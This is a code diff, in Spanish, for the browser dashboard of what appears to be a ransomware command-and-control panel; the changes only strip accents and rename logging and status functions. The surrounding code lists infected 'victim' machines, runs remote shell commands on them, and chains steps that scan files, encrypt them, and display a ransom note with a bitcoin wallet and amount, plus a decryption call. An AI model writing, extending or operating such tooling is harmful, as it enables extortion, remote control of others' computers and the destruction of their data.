@@ -1,5 +1,5 @@
 // ===============================
-// LÓGICA PRINCIPAL DEL DASHBOARD
+// LOGICA PRINCIPAL DEL DASHBOARD
 // ===============================
 
 // Estado Global
@@ -50,7 +50,7 @@ window.usarRutaPersonalizada = function () {
   }
 };
 
-// Obtener logs del sistema de la víctima
+// Obtener logs del sistema de la victima
 window.obtenerLogsVictima = async function () {
   if (!clienteActual) {
     alert('Selecciona un cliente primero');
@@ -78,7 +78,7 @@ window.obtenerLogsVictima = async function () {
   }
 };
 
-// Actualizar visualización del directorio al ejecutar comando
+// Actualizar visualizacion del directorio al ejecutar comando
 window.actualizarDirectorio = function (newPath) {
   currentDirectory = newPath;
   const dirDisplay = document.getElementById('currentDirectory');
@@ -106,11 +106,11 @@ document.addEventListener('DOMContentLoaded', () => {
   cargarClientes();
   cargarEstadisticas();
 
-  // Actualizar estadísticas periódicamente (cada 30 segundos)
+  // Actualizar estadisticas periodicamente (cada 30 segundos)
   setInterval(cargarEstadisticas, 30000);
 
   // ===============================
-  // CARGAR ESTADÍSTICAS DE BD
+  // CARGAR ESTADISTICAS DE BD
   // ===============================
   async function cargarEstadisticas() {
     try {
@@ -124,14 +124,14 @@ document.addEventListener('DOMContentLoaded', () => {
         keyStats.textContent = data.keys || 0;
       }
     } catch (e) {
-      console.error('Error cargando estadísticas:', e);
+      console.error('Error cargando estadisticas:', e);
     }
   }
 
   // ===============================
   // REGISTRO DE ACTIVIDAD
   // ===============================
-  function log(message, type = 'info') {
+  function registrarLog(message, type = 'info') {
     if (!activityLog) return;
     const time = new Date().toLocaleTimeString();
     const entry = document.createElement('div');
@@ -148,29 +148,29 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Escuchar logs del servidor (Centralizado)
   socket.on('server-log', (data) => {
-    log(data.msg, data.type);
+    registrarLog(data.msg, data.type);
   });
 
   socket.on('connect', () => {
-    log(' Dashboard Conectado', 'success');
+    registrarLog(' Dashboard Conectado', 'success');
     console.log('Socket Conectado:', socket.id);
-    setWsStatus(true);
+    establecerEstadoWs(true);
     cargarClientes();
   });
 
   socket.on('disconnect', () => {
-    log(' Dashboard Desconectado', 'error');
-    setWsStatus(false);
+    registrarLog(' Dashboard Desconectado', 'error');
+    establecerEstadoWs(false);
   });
 
   socket.on('cliente-conectado', (cliente) => {
-    // log(` Cliente conectado: ${cliente.nombre}`, 'success'); // Redundante con server-log
+    // registrarLog(` Cliente conectado: ${cliente.nombre}`, 'success'); // Redundante con server-log
     console.log('Evento cliente conectado:', cliente);
     agregarCliente(cliente);
   });
 
   socket.on('cliente-desconectado', (data) => {
-    // log(` Cliente desconectado: ${data.id.substring(0, 8)}...`, 'error'); // Redundante con server-log
+    // registrarLog(` Cliente desconectado: ${data.id.substring(0, 8)}...`, 'error'); // Redundante con server-log
     removerCliente(data.id);
   });
 
@@ -189,7 +189,7 @@ document.addEventListener('DOMContentLoaded', () => {
       let cleanOutput = data.output.replace(/\r\n/g, ' ').trim();
       if (cleanOutput.length > 80) cleanOutput = cleanOutput.substring(0, 80) + '...';
       if (cleanOutput) {
-        // log(` Output: ${cleanOutput}`, 'info'); // Redundante
+        // registrarLog(` Output: ${cleanOutput}`, 'info'); // Redundante
       }
     }
 
@@ -234,12 +234,12 @@ document.addEventListener('DOMContentLoaded', () => {
         break;
     }
 
-    // log(`${icono} ${data.mensaje}`, tipo);
-    // log(`${icono} ${data.mensaje || 'Actividad desconocida'}`, tipo); // Redundante
+    // registrarLog(`${icono} ${data.mensaje}`, tipo);
+    // registrarLog(`${icono} ${data.mensaje || 'Actividad desconocida'}`, tipo); // Redundante
   });
 
   // ===============================
-  // Funciones de GESTIÓN DE CLIENTES
+  // Funciones de GESTION DE CLIENTES
   // ===============================
   async function cargarClientes() {
     try {
@@ -251,11 +251,11 @@ document.addEventListener('DOMContentLoaded', () => {
         console.log('Clientes cargados:', data.clientes.length);
         clientes = data.clientes;
         actualizarSelectClientes();
-        setClientesStatus(clientes.length);
+        establecerEstadoClientes(clientes.length);
       }
     } catch (error) {
       console.error('Error al obtener:', error);
-      log('Error cargando clientes: ' + error.message, 'error');
+      registrarLog('Error cargando clientes: ' + error.message, 'error');
     }
   }
 
@@ -289,14 +289,14 @@ document.addEventListener('DOMContentLoaded', () => {
     if (!clientes.find(c => c.id === cliente.id)) {
       clientes.push(cliente);
       actualizarSelectClientes();
-      setClientesStatus(clientes.length);
+      establecerEstadoClientes(clientes.length);
     }
   }
 
   function removerCliente(clienteId) {
     clientes = clientes.filter(c => c.id !== clienteId);
     actualizarSelectClientes();
-    setClientesStatus(clientes.length);
+    establecerEstadoClientes(clientes.length);
     if (destinoSelect && destinoSelect.value === clienteId) {
       destinoSelect.value = '';
       clienteActual = null;
@@ -317,7 +317,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       if (clienteId) {
         clienteActual = clientes.find(c => c.id === clienteId);
-        log(`🎯 Seleccionado: ${clienteActual?.nombre}`, 'info');
+        registrarLog(`🎯 Seleccionado: ${clienteActual?.nombre}`, 'info');
         if (infoSection) infoSection.style.display = 'block';
         if (clienteActual?.sistemaInfo) {
           mostrarInfoCliente(clienteActual.sistemaInfo, clienteActual.claveAESCliente || clienteActual.clave);
@@ -351,11 +351,11 @@ document.addEventListener('DOMContentLoaded', () => {
     destinoSelect.addEventListener('focus', cargarClientes);
   }
 
-  // Botón Actualizar
+  // Boton Actualizar
   if (btnRefrescarClientes) {
     btnRefrescarClientes.addEventListener('click', () => {
       cargarClientes();
-      log('🔄 Actualizando lista...', 'info');
+      registrarLog('🔄 Actualizando lista...', 'info');
     });
   }
 
@@ -367,7 +367,7 @@ document.addEventListener('DOMContentLoaded', () => {
   window.ejecutarPaso = async function (paso) {
     const clienteId = destinoSelect ? destinoSelect.value : null;
     if (!clienteId) {
-      log('⚠️ Selecciona un cliente primero', 'warning');
+      registrarLog('⚠️ Selecciona un cliente primero', 'warning');
       return;
     }
 
@@ -378,11 +378,11 @@ document.addEventListener('DOMContentLoaded', () => {
     try {
       switch (paso) {
         case 1:
-          log(' Paso 1: Obteniendo info...', 'info');
-          log(' Paso 1: Solicitud enviada', 'success');
+          registrarLog(' Paso 1: Obteniendo info...', 'info');
+          registrarLog(' Paso 1: Solicitud enviada', 'success');
           break;
         case 2:
-          log(' Paso 2: Escaneando...', 'info');
+          registrarLog(' Paso 2: Escaneando...', 'info');
           const res2 = await fetch('/api/escanear-archivos', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -391,23 +391,23 @@ document.addEventListener('DOMContentLoaded', () => {
           const data2 = await res2.json();
           if (data2.success) {
             const resultado = data2.resultado;
-            log(` Encontrados: ${resultado.total || 0} archivos (${resultado.tamanioTotalHumano || 'N/A'})`, 'success');
+            registrarLog(` Encontrados: ${resultado.total || 0} archivos (${resultado.tamanioTotalHumano || 'N/A'})`, 'success');
             // Mostrar lista de archivos escaneados
             if (resultado.archivos && resultado.archivos.length > 0) {
-              log(`  Archivos encontrados:`, 'info');
+              registrarLog(`  Archivos encontrados:`, 'info');
               resultado.archivos.slice(0, 20).forEach(a => {
-                log(`    📄 ${a.nombre} (${a.tamanio}) | ${a.directorio}`, 'info');
+                registrarLog(`    📄 ${a.nombre} (${a.tamanio}) | ${a.directorio}`, 'info');
               });
               if (resultado.archivos.length > 20) {
-                log(`    ... y ${resultado.archivos.length - 20} más`, 'info');
+                registrarLog(`    ... y ${resultado.archivos.length - 20} mas`, 'info');
               }
             }
           } else {
-            log(' Error: ' + data2.error, 'error');
+            registrarLog(' Error: ' + data2.error, 'error');
           }
           break;
         case 3:
-          log(' Paso 3: Cifrando...', 'warning');
+          registrarLog(' Paso 3: Cifrando...', 'warning');
           const res3 = await fetch('/api/cifrar-archivos', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -415,49 +415,49 @@ document.addEventListener('DOMContentLoaded', () => {
           });
           const data3 = await res3.json();
           if (data3.success) {
-            log(` Cifrados: ${data3.resumen.totalCifrados} archivos`, 'success');
+            registrarLog(` Cifrados: ${data3.resumen.totalCifrados} archivos`, 'success');
             // Mostrar metadatos del cifrado
             if (data3.metadatos) {
-              log(`  Algoritmo: ${data3.metadatos.algorithm}`, 'info');
-              log(`  Clave: ${data3.metadatos.keyPreview}`, 'info');
+              registrarLog(`  Algoritmo: ${data3.metadatos.algorithm}`, 'info');
+              registrarLog(`  Clave: ${data3.metadatos.keyPreview}`, 'info');
             }
             // Mostrar lista de archivos cifrados
             if (data3.archivosCifrados && data3.archivosCifrados.length > 0) {
-              log(`  Archivos cifrados:`, 'info');
+              registrarLog(`  Archivos cifrados:`, 'info');
               data3.archivosCifrados.forEach(a => {
-                log(`    📄 ${a.nombre} | IV: ${a.iv.substring(0, 8)}... | ${a.directorio}`, 'info');
+                registrarLog(`    📄 ${a.nombre} | IV: ${a.iv.substring(0, 8)}... | ${a.directorio}`, 'info');
               });
             }
             if (document.getElementById('statEncrypted'))
               document.getElementById('statEncrypted').textContent = data3.resumen.totalCifrados;
           } else {
-            log(' Error: ' + data3.error, 'error');
+            registrarLog(' Error: ' + data3.error, 'error');
           }
           break;
         case 4:
-          log(' Paso 4: Ransom Note...', 'warning');
+          registrarLog(' Paso 4: Ransom Note...', 'warning');
           const res4 = await fetch('/api/mostrar-nota', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ clienteId, wallet: '1KP7...', amount: '2' })
           });
           const data4 = await res4.json();
-          if (data4.success) log(' Nota mostrada', 'success');
-          else log(' Error: ' + data4.error, 'error');
+          if (data4.success) registrarLog(' Nota mostrada', 'success');
+          else registrarLog(' Error: ' + data4.error, 'error');
           break;
       }
     } catch (e) {
-      log(' Exception: ' + e.message, 'error');
+      registrarLog(' Exception: ' + e.message, 'error');
     }
     if (btn) btn.disabled = false;
   };
 
   window.ejecutarCadenaCompleta = async function () {
     if (!destinoSelect || !destinoSelect.value) {
-      log(' Selecciona cliente', 'warning');
+      registrarLog(' Selecciona cliente', 'warning');
       return;
     }
-    log(' Ejecutando secuencia completa...', 'warning');
+    registrarLog(' Ejecutando secuencia completa...', 'warning');
     const btn = document.getElementById('btnFull');
     if (btn) btn.disabled = true;
 
@@ -465,7 +465,7 @@ document.addEventListener('DOMContentLoaded', () => {
       await window.ejecutarPaso(i);
       await new Promise(r => setTimeout(r, 1500));
     }
-    log('🏁 Secuencia finalizada', 'success');
+    registrarLog('🏁 Secuencia finalizada', 'success');
     if (btn) btn.disabled = false;
   };
 
@@ -473,7 +473,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const clienteId = destinoSelect ? destinoSelect.value : null;
     if (!clienteId) return;
 
-    log(' Iniciando descifrado...', 'info');
+    registrarLog(' Iniciando descifrado...', 'info');
     try {
       const res = await fetch('/api/descifrar-archivos', {
         method: 'POST',
@@ -482,19 +482,19 @@ document.addEventListener('DOMContentLoaded', () => {
       });
       const data = await res.json();
       if (data.success) {
-        log(` Restaurados: ${data.totalDescifrados} archivos`, 'success');
+        registrarLog(` Restaurados: ${data.totalDescifrados} archivos`, 'success');
         if (document.getElementById('statEncrypted'))
           document.getElementById('statEncrypted').textContent = '0';
       } else {
-        log(' Error: ' + data.error, 'error');
+        registrarLog(' Error: ' + data.error, 'error');
       }
     } catch (e) {
-      log(' Error: ' + e.message, 'error');
+      registrarLog(' Error: ' + e.message, 'error');
     }
   };
 
   // ===============================
-  // EJECUCIÓN DE COMANDO
+  // EJECUCION DE COMANDO
   // ===============================
   if (form) {
     form.addEventListener('submit', async (e) => {
@@ -506,7 +506,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (!cmd || !cid) return;
 
       if (btnEjecutar) btnEjecutar.disabled = true;
-      log(`> ${cmd}`, 'info');
+      registrarLog(`> ${cmd}`, 'info');
 
       try {
         const res = await fetch('/api/ejecutar-remoto', {
@@ -517,7 +517,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const d = await res.json();
         if (d.resultado) mostrarResultado(d.resultado, cmd);
       } catch (e) {
-        log(' Error: ' + e.message, 'error');
+        registrarLog(' Error: ' + e.message, 'error');
       }
 
       if (btnEjecutar) btnEjecutar.disabled = false;
@@ -526,7 +526,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   // ===============================
-  // FUNCIONES AUXILIARES DE VISUALIZACIÓN
+  // FUNCIONES AUXILIARES DE VISUALIZACION
   // ===============================
   function mostrarInfoCliente(info, clave) {
     const el = document.getElementById('clientInfoDetails');
@@ -581,14 +581,14 @@ document.addEventListener('DOMContentLoaded', () => {
     resultadoDiv.innerHTML = html;
   }
 
-  function setWsStatus(ok) {
+  function establecerEstadoWs(ok) {
     if (!wsStatus) return;
     wsStatus.innerHTML = ok
       ? '<span class="status-indicator online" style="background:#1bc5bd; width:8px; height:8px; display:inline-block; border-radius:50%; margin-right:5px;"></span> WS: Online'
       : '<span class="status-indicator offline" style="background:#f64e60; width:8px; height:8px; display:inline-block; border-radius:50%; margin-right:5px;"></span> WS: Offline';
   }
 
-  function setClientesStatus(n) {
+  function establecerEstadoClientes(n) {
     if (clientesStatus) clientesStatus.textContent = n;
   }
 
